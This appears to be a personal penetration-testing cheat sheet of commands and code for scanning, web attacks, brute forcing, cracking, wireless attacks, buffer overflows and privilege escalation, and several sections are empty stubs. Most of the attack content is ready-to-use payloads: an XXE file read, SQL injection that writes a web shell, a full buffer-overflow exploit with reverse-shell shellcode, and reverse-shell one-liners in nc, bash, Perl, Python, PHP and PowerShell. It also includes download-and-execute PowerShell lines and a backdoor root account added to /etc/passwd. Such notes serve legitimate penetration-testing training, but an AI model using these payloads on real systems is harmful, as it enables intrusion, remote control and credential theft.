# Table of Contents
* [Enumeration](#Enumeration)
* [Web Application Attacks](#Web Application Attacks)
* [Brute Forcing](#Brute Forcing)
* [Cracking Hashes](#Cracking Hashes)
* [Wireless Attacks](#Wireless Attacks)
* [OSINT](#OSINT)
* [Buffer Overflow](#Buffer Overflow)
* [Linux](#Linux)
* [Windows](#Windows)
* [Protocols](#Protocols)
* [Technologies](#Technologies)
* [Known Vulnerabilities](#Known Vulnerabilities)
* [Forensics](#Forensics)

# Enumeration
## Port Scanning

``` bash
nmap -sC -sV -oA outfiles 192.168.1.0/24
nmap --top-ports=1000 -sT -Pn 10.10.10.10,11,12 --open
nmap -Pn -n -p21,22,139,445,3632 --script vuln -sV -oN nmap/vuln_scan 10.10.10.3
nmap -T4 -Pn -p- 10.10.10.10 -o tmp.nmap > /dev/null
nmap -sC -sV -o portscan.nmap -p $(cat tmp.nmap | grep open | cut -d\t -f1 | sed 's/\///g' | paste -sd, ) 10.10.10.10 > /dev/null
for i in `nmap -T4 -p- 192.168.67.133 |grep open |cut -f 1 -d /` ; do nmap -T4 -p$i -A 192.168.67.133; done
nmap -sU 10.10.10.116 # UDP
```

## Web Application Enumeration
### BurpSuite
Go to "Target" > "Site map" > right click on host > "Spider this host" 
### Directory Enumeration
```
gobuster dir -k -u https://10.10.10.7/ -w usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt	
```

Install golang and add the following two lines to ~/.bashrc (or ~/.profiles)

```
export GOPATH=$HOME/go
export PATH=$PATH:$GOPATH/bin		
```
## Vulnerability Scan
### Nessus
```
sudo /etc/init.d/nessus start 
# http://localhost:8834

```
### Nikto
TO BE DONE

### SQL Enumeration
Connect remotely to mysql database:
```
mysql --host=10.10.10.10 --port=1234 --user=db_user -p
```
Show privileges
```
SHOW Grants;
show variables;
```



# Web Application Attacks
## Cross Site Scripting (XSS)
:information_source: https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A7-Cross-Site_Scripting_(XSS)
:information_source: https://www.scip.ch/en/?labs.20171214 
:information_source: https://xss-game.appspot.com/
:information_source: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
:information_source: https://github.com/payloadbox/xss-payload-list
:information_source: https://tryhackme.com/room/learnowaspzap

## XML External Entities (XXE)
Basic idea: upload an xml to test if it gets parsed and then abusing the doctype definition (DTD).

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

## SQL Injection
### Resources
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
* https://github.com/payloadbox/sql-injection-payload-list

### Manual Enumeration
```
http://10.10.10.10/debug.php?id=1 order by 1 # increase until an error occurs to get number of columns

http://10.10.10.10/debug.php?id=1 union all select 1, 2, 3
http://10.10.10.10/debug.php?id=1 union all select 1, username, password
http://10.10.10.10/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
http://10.10.10.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

### sqlmap
* example commands
```
sqlmap --url http://10.10.128.77:8000/sqlpanel --tables --columns
sqlmap -r sqlpanel.request --dbms=sqlite --dump-all --tamper=space2comment
```
* capture sqlpane.request with burpsuite first
* --tamper=space2comment for trying to bypass WAF

## Server Side Template Injection (SSTI)
Server-side template injection is a vulnerability where the attacker injects malicious input into a template to execute commands on the server-side

* See https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
* Payload Generator: https://github.com/VikasVarshney/ssti-payload

Make sure to try every syntax
```
*{}
${}
#{}
```

## WebDAV
WebDAV is an extenstion of HTTP that allows clients to perform remote Web content authoring operations. RFC4918.

### Resources
* [Blogpost from Nullbyte](https://null-byte.wonderhowto.com/how-to/exploit-webdav-server-get-shell-0204718/)
* HackTheBox: Granny 

### davtest
DAVTest tests WebDAV enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target.
```
davtest -url http://10.10.10.15
```

### cadaver
Cadaver is a simple command-line client, similar to for example the 'ftp' program. It has some advanced features such as lock-management, property management, DASL and version control support.
```
cadaver http://10.10.10.15/mfu
```

# Brute Forcing
:information_source: Password Lists: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
## medusa
```
medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin
```

## hydra
For ssh try shorter password lists like ``/usr/share/wfuzz/wordlist/others/common_pass.txt``
```
hydra -l kali -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.1.10 http-get
# specify number of threads with -t to avoid getting blocked
hydra -l user -P wordlist ssh://10.10.10.10 -f -V -t 3
```
Get help for service module
```
hydra http-form-post -U
```
Example:
```
hydra -l admin -P <PASSLIST> <IP> http-post-form "/index.php:username=^USER^&password=^PASS^&login=login:Login failed" -V
# use -f to stop the attack once a result is found
```

Where first field (delimited by :)  is URL. Second field contains parameters and third contains a string within the response from webpage which indicates that the login failed.
## wfuzz

``` bash
wfuzz -u http://10.10.10.157/centreon/api/index.php?action=authenticate -d ’username=admin&password=FUZZ’ -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt --hc 403
wfuzz --hc 404 -c -z file,big.txt http://10.10.26.165/site-log.php\?date=FUZZ
```

## RDP
* [crowbar](https://github.com/galkan/crowbar)
```
crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1
```
In case of error: "File: /usr/share/wordlists/rockyou.txt doesn't exists" it is due encoding issues.
Convert list with:
```
iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt > rockyou_utf8.txt
````

## Archives
Bruteforce password protected .zip or .rar file
* fcrackzip
* rarcrack
* john the ripper => zip2john, rar2john

# Cracking Hashes
:information_source: Password Lists: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)

## Identify Hash
* [hash-identifier](https://psypanda.github.io/hashID/)
* [Sample Password Hashes](https://openwall.info/wiki/john/sample-hashes)

## Example MD5 Hash
```
hashcat --example-hashes | grep MD5 -C 4
hashcat -m 500 hash rockyou.txt
hashcat -m 500 -a0 --force 'tmp' '/usr/share/wordlists/rockyou.txt'	
```

# Wireless Attack
## WPS Pin Recovery
```
reaver -i wlan0mon -b 9C:AD...(network-target-mac) -c 1 (channel 1) -f (fixed:one channel) -a -w(win7 register art) -v (verbose) -K 1 (Pixie-attack: hit common pins)
#if Pixie (-K 1 doesnt work, run -vv (very verbose))
```

## Capture WPA/WPA2 Handshake
```
ifconfig wlan0 down
macchanger -r wlan0
ifconfig wlan0 up
airmon-ng
airmon-ng check
airmon-ng check kill
airmon-ng start wlan0
```
```
airodump-ng wlan0mon [--bssid F0:7B.... where F0:7B.. is mac of "target-router"][--channel 11][--write Desktop/path/to/my/file]
```
```
aireplay-ng wlan0mon [--deauth 2000 (sending 2000 deauth packages)][-a F0:7B.. (-a: Accesspoint:Macadress of router)][-c F9:2D..(-c:Client: Macadress of target)]
#sending deauth packages to force a handshake
```

## Crack WPA/WPA2 Handshake

```
aircrack-ng Path/to/my/captureFile/with/handshake.cap -w /Path/to/my/password/list.txt
```

# OSINT
TO BE DONE: Add PP content
* https://namechk.com/
* https://whatsmyname.app/,
* https://namecheckup.com/
* https://github.com/WebBreacher/WhatsMyName
* https://github.com/sherlock-project/sherlock
* https://netcraft.com

## Search for breaches
* https://haveibeenpwned.com/
* https://scylla.sh    # provides password, free
* https://dehashed.com/   # provides password, paid

# Buffer Overflow
* Check if you can write executable code in the stack with peda: ``checksec``. 
* Alternatively you have to do it manually or use a script: https://github.com/slimm609/checksec.sh/blob/master/README.md 
* If NX is enabled writing shellcode into buffer will not execute

## Concept
```
     STACK

________________
|   Function   |
----------------
|     Data     |
----------------
|Return Address|
----------------
|Base Pointers |
----------------
|      ^       |
|      |       |
|              |
|    Buffer    |
|              |
|              |
________________
```
* Try to exceed buffer and overwrite base pointers and return address
* Craft buffer according to the following concept 

```bash
python -c 'print "\x90" * 470 + "<shellcode>" + "<memory address in middle of NOPs>" 
```
* \x90 is a NOP and works like a sled since it gets skipped
* therefore run the binary and check $esp for NOP's
* choose address in middle and paste it as 'memory address in middle of NOPs'
* in the example the offset is 500
* $eip gets overwritten with memory address in middle of NOP's
* NOP's get hit 
* instructions follow until shellcode is hit and executes

## ret2libc
* you need the libc address as kind of a 'base'
* afterwards the stack frame dictates the order the function call and parameters are written
* see this [link](https://newbedev.com/why-must-a-ret2libc-attack-follow-the-order-system-exit-command) (explains it much better)
```
function_address
return_address
parameters
```
* so either try to provide some junk for parameters so the function may return to your payload
* or provide actual exit address and payload as parameter for system()

1. find the libc address 
```bash
ldd <binary>
```
2. find the system() address
```bash
locate libc.so.6
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
3. find the exit() address
```bash
locate libc.so.6
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
```
4. find /bin/sh in libc
```bash
strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
5. create simple python script to print payload
```python
import struct

junk = "A" * 52

libc_addr = 0xf7d79000
sh_addr = struct.pack('<I', libc_addr + 0x0015ba0b)
system_addr = struct.pack('<I', libc_addr + 0x0003ada0)
exit_addr = struct.pack('<I', libc_addr + 0x0002e9d0)

payload = junk + system_addr + exit_addr + sh_addr

print payload
```

## Example
```
# First try to get exact overflow with either msf-pattern_create or by manual/scripted fuzzing
# Example: Offset at 1252
# Overwrite EIP with 'B's and check with debugger if a register points into memory that we can control
#
# Example: 
# < 1252 >
# AAA...AABBBBCCCCCCCCCCCCCCCCCC
#         \  /\                 /
#          \/  \               /
#         EIP  ESP points to this
#
# Check for badchars, see https://github.com/cytopia/badchars
# Simply paste 'A's and the badchars, follow the dump at crash and check what characters are not allowed '\x00'
# Example badchars: \x0a\x1a\x1b\xae\xce\x69
#
# Generate shellcode
# msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=192.168.119.232 LPORT=4444 -f python -b "\x0a\x1a\x1b\xae\xce\x69"
# => 351 bytes
buf =  b"" 
buf += b"\xda\xcb\xd9\x74\x24\xf4\xbe\xec\xf0\x80\xa0\x5b\x33"
buf += b"\xc9\xb1\x52\x83\xeb\xfc\x31\x73\x13\x03\x9f\xe3\x62"
buf += b"\x55\xa3\xec\xe1\x96\x5b\xed\x85\x1f\xbe\xdc\x85\x44"
buf += b"\xcb\x4f\x36\x0e\x99\x63\xbd\x42\x09\xf7\xb3\x4a\x3e"
buf += b"\xb0\x7e\xad\x71\x41\xd2\x8d\x10\xc1\x29\xc2\xf2\xf8"
buf += b"\xe1\x17\xf3\x3d\x1f\xd5\xa1\x96\x6b\x48\x55\x92\x26"
buf += b"\x51\xde\xe8\xa7\xd1\x03\xb8\xc6\xf0\x92\xb2\x90\xd2"
buf += b"\x15\x16\xa9\x5a\x0d\x7b\x94\x15\xa6\x4f\x62\xa4\x6e"
buf += b"\x9e\x8b\x0b\x4f\x2e\x7e\x55\x88\x89\x61\x20\xe0\xe9"
buf += b"\x1c\x33\x37\x93\xfa\xb6\xa3\x33\x88\x61\x0f\xc5\x5d"
buf += b"\xf7\xc4\xc9\x2a\x73\x82\xcd\xad\x50\xb9\xea\x26\x57"
buf += b"\x6d\x7b\x7c\x7c\xa9\x27\x26\x1d\xe8\x8d\x89\x22\xea"
buf += b"\x6d\x75\x87\x61\x83\x62\xba\x28\xcc\x47\xf7\xd2\x0c"
buf += b"\xc0\x80\xa1\x3e\x4f\x3b\x2d\x73\x18\xe5\xaa\x74\x33"
buf += b"\x51\x24\x8b\xbc\xa2\x6d\x48\xe8\xf2\x05\x79\x91\x98"
buf += b"\xd5\x86\x44\x0e\x85\x28\x37\xef\x75\x89\xe7\x87\x9f"
buf += b"\x06\xd7\xb8\xa0\xcc\x70\x52\x5b\x87\xbe\x0b\x14\xbf"
buf += b"\x57\x4e\xda\x2e\xf4\xc7\x3c\x3a\x14\x8e\x97\xd3\x8d"
buf += b"\x8b\x63\x45\x51\x06\x0e\x45\xd9\xa5\xef\x08\x2a\xc3"
buf += b"\xe3\xfd\xda\x9e\x59\xab\xe5\x34\xf5\x37\x77\xd3\x05"
buf += b"\x31\x64\x4c\x52\x16\x5a\x85\x36\x8a\xc5\x3f\x24\x57"
buf += b"\x93\x78\xec\x8c\x60\x86\xed\x41\xdc\xac\xfd\x9f\xdd"
buf += b"\xe8\xa9\x4f\x88\xa6\x07\x36\x62\x09\xf1\xe0\xd9\xc3"
buf += b"\x95\x75\x12\xd4\xe3\x79\x7f\xa2\x0b\xcb\xd6\xf3\x34"
buf += b"\xe4\xbe\xf3\x4d\x18\x5f\xfb\x84\x98\x6f\xb6\x84\x89"
buf += b"\xe7\x1f\x5d\x88\x65\xa0\x88\xcf\x93\x23\x38\xb0\x67"
buf += b"\x3b\x49\xb5\x2c\xfb\xa2\xc7\x3d\x6e\xc4\x74\x3d\xbb"
buffer = b"A"*1252
eip = b"\xb2\x11\x80\x14"
shellcode = buf 
nops = b"\x90"*12
buffer2 = b"B"*1000

payload = buffer + eip + nops + shellcode + buffer2

f = open('payload', 'wb')
f.write(payload)
f.close()

# cat payload | nc 10.10.10.10 5000
```
## EDB Debugger (Linux)
Install
```
sudo apt install edb-debugger
```
### Search a return address
1. See Plugins > OpcodeSearcher
2. Search ESP -> EIP and select your program

## Immunity Debugger (Windows)
### Finding a Return Address
```
» msf-nasm_shell
nasm > jmp esp
00000000  FFE4              jmp esp

```
Use the mona plugin and run
```
!mona modules # get all modules
!mona find -s "\xff\xe4" -m "program.dll"
```
Check if the address contain any bad chars since it will most likely not work otherwise


# Linux
## Bash
* https://www.bashoneliners.com/
* https://wiki.bash-hackers.org/syntax/expansion/brace

### Create Password List
Create text file with keywords
```bash
January 
February
March
April
May
June
July
August
September
October
November
December
Autumn
Spring
Fall
Summer
Winter
Password
Forest
Secret
```
```bash
for i in $(cat pwlist.txt); do echo $i; echo ${i}\!; echo ${i}2020; echo ${i}2019; done > tmp
mv tmp pwlist.txt

hashcat --force --stdout pwlist.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/leetspeak.rule -r /usr/share/hashcat/rules/toggles1.rule   > tmp
mv tmp pwlist.txt
```

## Custom wordlist generator
Fetch Keywords from a website
* [CeWL](https://digi.ninja/projects/cewl.php)
```
cewl www.domain.com -m 6 -w wordlist.txt
```
* [crunch](https://sourceforge.net/projects/crunch-wordlist/)

|Placeholder| 	Character Translation|
|----------|-------------------|
|@ |Lower case alpha characters|
|, |Upper case alpha characters|
|% |Numeric characters|
|^ |Special characters including space|
```
crunch 6 6 -t %%%%^^ > chars.txt
crunch 24 24 -t ThisIsTheUsersPassword%% -o crunched.txt 
```

## Download Accelerator
```bash
axel -a -n 20 -o report.pdf https://dummy.org 
```

## Automated IP Lookup
```bash
~/mfu# curl -s https://api.greynoise.io/v3/community/8.8.8.8 | python3 -m json.tool
{
    "ip": "8.8.8.8",
    "noise": false,
    "riot": true,
    "classification": "benign",
    "name": "Google Public DNS",
    "link": "https://viz.greynoise.io/riot/8.8.8.8",
    "last_seen": "2021-03-30",
    "message": "Success"
}
```

## Pasteable Archive Generator (Pasta)
```
#!/bin/bash
#
# Create a script to recreate the specified file in a different place.
# (pasta stands for *PAST*eable *A*rchive)
#
# Requirements:
#  for this script:
#    - bash, gzip, base64
#
# for the generated script:
#    - Bourne shell from UNIX v7 or later
#    - OpenSSL with base64, or
#      base64 from GNU coreutils, or
#      base64 from BSD
#    - gunzip
#
# v2 enhancements:
# ----------------
#  * work around ~20 year old bug in the Almquist shell and descendants
#  * do not depend on external shell libraries anymore
#  * more documentation
#  * support XZ and zopfli compression
#  * support ASCII85 and Base91 encoding
#
set -eu
quit(){
            echo "$*" >&2
            exit 1
}

usage(){
cat<<EOF
Usage: $0 [OPTION]... [FILE] [OUTFILE]

Create a 7-bit clean *past*eable *a*rchive
OUTFILE is optional

  -p     Recreate file permissions
  -P     Recreate file at same path with same permissions (implies -p)
  -v     go viral!
  -z     zopfli compression (output compatible with gzip)
  -x     XZ compression
  -o     Optimal compression. Automatically choose best method
  -Z     old 'compress'
  -s     Shorter script, but less portable (GNU tools only)
  -6     Base64 encoding (default)
  -9     Base91 encoding
  -a     Ascii85 encoding
  -w N   wrap after N characters (default $WIDTH)
  -c     put output into clipboard
  -f     aa ('ascii armor') encoding
EOF
exit 0
}

# default options can be specified in PASTA env
[ "${PASTA-}" ] && set -- $PASTA "$@"
WIDTH=78
ENCODE="(openssl base64 2>&-||base64)"
# long option '--decode' needed for compatibility with FreeBSD base64
# (also used in MacOS X)
DECODE="(openssl base64 -d 2>&-||base64 --decode)"
COMPRESS="gzip -cn9"
DECOMPRESS="gunzip"
PERM=''
REC=''
EXTRA=''
CLIP=''
OPTC=''
BASE64=1
SELF=''
AA=''
while getopts "w:sxaz9pcoZh6rPvf" opt; do
            case $opt in
            o)
                        OPTC=1
                        ;;
            c)
                        CLIP=1
                        ;;
            p)
                        PERM=1
                        ;;
            r|P)
                        PERM=1
                        REC=1
                        ;;
            v)
                        PERM=1
                        REC=1
                        SELF=1
                        ;;
            z)
                        COMPRESS="zopfli -c"
                        ;;
            s)
                        ENCODE="(openssl base64 2>&-||base64)"
                        DECODE="base64 -d"
                        COMPRESS="gzip -cn9"
                        DECOMPRESS="zcat"
                        ;;
            Z)
                        COMPRESS="compress -c"
                        DECOMPRESS="uncompress"
                        ;;
            x)
                        COMPRESS="xz --x86 --lzma2=preset=9e -c"
                        DECOMPRESS="unxz"
                        ;;
            6)
                        BASE64='1'
                        DECODE="(openssl base64 -d 2>&-||base64 --decode)"
                        ENCODE="(openssl base64 2>&-||base64)"
                        ;;
            9)
                        BASE64=''
                        ENCODE="base91"
                        DECODE="base91 -d"
                        ;;
            a)
                        BASE64=''
                        ENCODE="ascii85 -n"
                        DECODE="ascii85 -dn"
                        ;;
            w)
                        WIDTH=$OPTARG
                        ;;
            f)
                        BASE64=''
                        AA='1'
                        ;;
            h)
                        usage
            esac
done
ORIGOPT="$@"
shift $((OPTIND - 1))
 
FILE="${1-}"
[ -z "$SELF" ] || FILE=$0
OUT="${2-}"
[ -n "$FILE" ] || usage
[ -r "$FILE" ] || quit "Can't read $FILE"
[ -f "$FILE" ] || quit "$FILE is not a regular file"
 
if [ "$PERM" ]; then
            if [ "$OSTYPE" = "linux-gnu" ]; then
                        PERM=$(stat -c '%a' "$FILE")
            else
                        PERM=$(stat -f '%A' "$FILE")
            fi
            EXTRA=";chmod $PERM \$F"
fi
 
if [ "$CLIP" -a ! "${CLIPEXEC-}" ]; then
            echo "Copying to clipboard..."
            if [ "$OSTYPE" = "linux-gnu" ]; then
                        CLIP="xclip"
            else
                        CLIP="pbcopy"
            fi
            CLIPEXEC=1 bash $0 $ORIGOPT | $CLIP
            echo "Done"
            exit 0
fi
 
if [ "$OPTC" ]; then
            zopfli=$(zopfli -c "$FILE"|wc -c)
            xz=$(xz --x86 --lzma2=preset=9e -c "$FILE"|wc -c)
            if [ "$zopfli" -lt "$xz" ]; then
                        COMPRESS="zopfli -c"
            else
                        COMPRESS="xz --x86 --lzma2=preset=9e -c"
                        DECOMPRESS="unxz"
            fi
fi
 
if [ "${OUT}" ]; then
            FBASE=$OUT
elif [ "$REC" ]; then
            FBASE=$(realpath -s -- "$FILE" 2>&- || readlink -f -- "$FILE")
else
            FBASE=${FILE##*/}
fi
 
# escape metacharacters
OUT=$(printf "F=%q" "$FBASE")
if [ "$BASE64" ]; then
            LINE="$DECODE<<E-O|$DECOMPRESS>\$F&&echo OK$EXTRA"
elif [ "$AA" ]; then
            echo "aa -p"
            if [ "$PERM" ]; then
                        aa pasta "$FBASE" "$PERM" < "$FILE"
            else
                        aa pasta "$FBASE" < "$FILE"
            fi
            exit
else
            LINE="$DECODE<<'E-O'|$DECOMPRESS>\$F&&echo OK$EXTRA"
fi
if [ $(( ${#OUT} + ${#LINE} )) -lt "$WIDTH" ];
then
            echo "$OUT;$LINE"
else
            echo "$OUT"
            echo "$LINE"
fi
ENCODE="$ENCODE | tr -d '\n' | fold -w $WIDTH"
$COMPRESS "$FILE" | eval "$ENCODE"
echo
echo "E-O"
echo
```

## Generate Shellcode from file
```
xxd -p lib.so | tr -d '\n' > lib.hex
# add '0x' before shellcode
```

## unshadow passwd file
```
unshadow passwd-file.txt shadow-file.txt
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

## Reverse Shells
Use rlwrap to use arrow keys within reverse shell
```
rlwrap nc -lvnp 3141
```

Upgrade Reverse Shell:

1. `` Ctrl+z`` to background session
2. `` stty raw -echo``
3. ``fg`` to foreground session again

### Netcat
```
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f # in case wrong version of nc is installed
```

### Bash
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

### Socat
```
# Listener
socat -d -d TCP4-LISTEN:443 STDOUT
# Send bash reverse shell
socat TCP4:10.10.10.10:443 EXEC:/bin/bash
```

### Perl
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```
#!/usr/bin/perl -w
use Socket;
$i="10.10.14.41";
$p=4443;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
open(STDOUT,">&S");
open(STDERR,">&S");
exec("/bin/sh -i");
};
```

### Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

 
### Using msfvenom 
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f raw > shell.php
msfvenom -p windows/exec CMD="cmd.exe /c type flag.txt" -f python -b"x00\x0a\x0d\x25\x26\x2b\x3d"
```


### Powershell
```
powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))"

c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.22:8000/Invoke-PowerShellTcp.ps1')
```

```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Encrypted Shell
Socat Bind Shell
```
# Create Cert and Key
openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
# Create .pem file
cat bind_shell.key bind_shell.crt > bind_shell.pem
# Setup Listener
sudo socat OPENSSL-LISTEN:443,cert=bin_shell.pem,verify=0,fork EXEC:/bin/bash
# OR Setup Listener with
sudo socat -d -d OPENSSL-LISTEN:443,cert=rev_shell.pem,verify=0,fork STDOUT
# Connect
socat - OPENSSL:10.10.10.10:443,verify=0
# OR Connect with
socat OPENSSL:192.168.119.223:443,verify=0 EXEC:'cmd.exe',pipes

```

## Privilege Escalation
Resources:
* https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation
* https://payatu.com/guide-linux-privilege-escalation
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation

### Get Capabilities
```
/sbin/getcap -r / 2>/dev/null
```

### Unix Privesc Check
* [unix-privesc-check](https://pentestmonkey.net/tools/audit/unix-privesc-check)

### LinEnum
Download [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) and run it on victim's machine. 

### Setuid bits
* https://gtfobins.github.io/
``` 
# Find SUID files
find / -user root -perm -4000 2>/dev/null
# Set UID bit
chmod u+s /script
```
### Search for executed cronjobs
```
grep "CRON" /var/log/cron.log
```

### Add user in /etc/passwd (if writable)
```
openssl passwd evil
echo "root2:Ur0xZo454Kq1s:0:0:root:/root/:/bin/bash" >> /etc/passwd
su root2 # passwd:evil
```

## Port Forwarding 
### Create SSH Key with forwarding permissions only
```
from="10.11.1.250",command="echo 'This account can only be used for port
forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa ssh-rsa
<SSHKEY> www-data@ajla
```

### Local Port Forwarding
Port is opened locally 

[rinetd](https://boutell.com/rinetd/) :
```
sudo apt install rinetd
echo "0.0.0.0 80 10.10.10.10 80" >> /etc/rinetd.conf # forward incoming requests on port 80 to 10.10.10.10 port 80
sudo service rinetd restart
```

SSH:
```
sudo ssh -N -L [bind_address:]port:host:hostport [username@address]
sudo ssh -N -L 127.0.0.1:1234:10.10.10.10:5678 user@10.10.10.10
# open 1234 locally and forward it to 11.11.11.11 on port 5678
```
 TO BE DONE : Remote Port forwarding etc. (plink, netsh, HTTPTunneling)

--------------------------------------------

# Windows
## Powershell
## Reverse Shells
## Privilege Escalation
## Active Directory
## Port Redirection and Tunneling
## MSSQL

# Protocols
## SMTP
## DNS
## SSH
## SMB
## SNMP
## POP3
## NFS

# Technologies
## WordPress
## SSL
## WireShark
## OracleDB
## PowerShell Empire
## MySQL

# Known Vulnerabilities
## Local File Inclusion (LFI)
## Upload Bypass
## Log Poisoning
## ShellShock
## Dirtyc0w Kernel Exploit (Linux)
See https://github.com/firefart/dirtycow
1. Transfer .c file to target
2. compile it with ``gcc -pthread dirty.c -o dirty -lcrypt``
3. execute the binary ``./dirty newpassword``
4. user ``firefart`` is created with root privileges

# Forensic
## Memory Analysis
## Reverse Engineering




